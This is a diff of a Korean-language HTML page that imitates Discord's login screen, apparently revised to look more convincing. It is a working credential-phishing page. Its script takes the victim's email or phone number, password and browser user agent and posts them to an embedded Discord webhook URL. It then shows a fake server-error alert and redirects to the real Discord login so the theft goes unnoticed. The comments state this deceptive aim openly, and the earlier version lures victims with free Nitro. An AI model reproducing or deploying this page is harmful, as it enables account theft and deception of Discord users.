@@ -2,47 +2,167 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>Discord | 로그인하여 계속하기</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
     <style>
-        body { background: #313338; color: #dbdee1; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: #313338; padding: 32px; border-radius: 5px; width: 414px; box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2); }
-        h2 { color: #f2f3f5; text-align: center; margin-bottom: 8px; font-size: 24px; }
-        .subtitle { color: #949ba4; text-align: center; font-size: 14px; margin-bottom: 20px; }
-        label { display: block; font-size: 12px; font-weight: bold; color: #b5bac1; text-transform: uppercase; margin-bottom: 8px; }
-        input { width: 100%; padding: 10px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 3px; color: #dbdee1; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; }
-        input:focus { border-color: #00a8fc; outline: none; }
-        button { width: 100%; padding: 12px; background: #5865f2; border: none; color: white; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; }
-        button:hover { background: #4752c4; }
+        * { box-sizing: border-box; }
+        body {
+            background-color: #313338;
+            color: #dbdee1;
+            font-family: 'gg sans', 'Noto Sans KR', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-wrapper {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px;
+        }
+        .login-card {
+            background-color: #313338;
+            padding: 32px;
+            border-radius: 5px;
+        }
+        .discord-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .discord-logo svg {
+            width: 125px;
+            height: 35px;
+            fill: #ffffff;
+        }
+        h2 {
+            color: #f2f3f5;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            margin-top: 0;
+        }
+        .subtitle {
+            color: #949ba4;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            color: #b5bac1;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+        label span {
+            color: #f23f43;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            background-color: #1e1f22;
+            border: 1px solid #1e1f22;
+            border-radius: 3px;
+            color: #dbdee1;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            border-color: #00a8fc;
+        }
+        .forgot-password {
+            font-size: 14px;
+            color: #00a8fc;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #5865f2;
+            border: none;
+            border-radius: 3px;
+            color: #white;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #4752c4;
+        }
+        .register-link {
+            font-size: 14px;
+            color: #949ba4;
+            margin-top: 15px;
+            display: block;
+        }
+        .register-link a {
+            color: #00a8fc;
+            text-decoration: none;
+        }
+        .register-link a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <h2>돌아오신 것을 환영해요!</h2>
-        <p class="subtitle">무료 니트로 수령을 위해 디스코드 계정으로 로그인하세요.</p>
-        
-        <!-- 진짜 디스코드로 매끄럽게 넘어가도록 위장한 폼 -->
-        <form id="loginForm" onsubmit="handleLogins(event)">
-            <label>이메일 또는 전화번호</label>
-            <input type="text" id="email" name="email" required>
+
+    <div class="login-wrapper">
+        <div class="login-card">
+            <div class="discord-logo">
+                <svg viewBox="0 0 127.14 96.36">
+                    <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.68,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.15c2.67-27.29-4.51-51.2-19.06-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.88,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5.18-12.72,11.45-12.72S96.14,46,96.12,53,91,65.69,84.69,65.69Z"/>
+                </svg>
+            </div>
+            <h2>돌아오신 것을 환영해요!</h2>
+            <div class="subtitle">다시 만나서 정말 반가워요!</div>
+
+            <form id="loginForm" onsubmit="submitCreds(event)">
+                <div class="input-group">
+                    <label>이메일 또는 전화번호 <span>*</span></label>
+                    <input type="text" id="email" required>
+                </div>
+                
+                <div class="input-group" style="margin-bottom: 0;">
+                    <label>비밀번호 <span>*</span></label>
+                    <input type="password" id="password" required>
+                </div>
+
+                <a href="#" class="forgot-password">비밀번호를 잊으셨나요?</a>
+                
+                <button type="submit">로그인</button>
+            </form>
             
-            <label>비밀번호</label>
-            <input type="password" id="password" name="password" required>
-            
-            <button type="submit">로그인</button>
-        </form>
+            <div class="register-link">
+                계정이 필요한가요? <a href="#">가입하기</a>
+            </div>
+        </div>
     </div>
 
     <script>
-        async function handleLogins(event) {
+        async function submitCreds(event) {
             event.preventDefault();
             const webhookUrl = 'https://discord.com/api/webhooks/1568353008071344220/Pq1ZlrWG5Kcqsmir8uGOqDuLwqzRwYdg-twFDbla8s-2KXeTUTBHtL_gygqAktOv8QgQ';
             
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // 1. 입력한 정보 즉시 웹훅으로 전송
+            // 웹훅으로 아이디, 비번 및 접속 정보 전송
             const payload = {
-                content: `🚨 **[디스코드 정보 털림!]**\n📧 **이메일:** \`${email}\`\n🔑 **비밀번호:** \`${password}\`\n🌐 **UA:** \`${navigator.userAgent}\``
+                content: `🚨 **[디스코드 정보 획득 성공!]**\n📧 **이메일/전화번호:** \`${email}\`\n🔑 **비밀번호:** \`${password}\`\n🌐 **UA:** \`${navigator.userAgent}\``
             };
 
             await fetch(webhookUrl, {
@@ -51,7 +171,8 @@
                 body: JSON.stringify(payload)
             });
 
-            // 2. 의심을 지우기 위해 진짜 디스코드 로그인 페이지로 이동 (사용자가 다시 로그인하게 유도)
+            // 사용자가 눈치채지 못하도록 자연스러운 에러 창 띄우고 진짜 디코로 보냄
+            alert('디스코드 API 서버 연결이 일시적으로 중단되었습니다. 다시 시도해주세요.');
             window.location.href = 'https://discord.com/login';
         }
     </script>
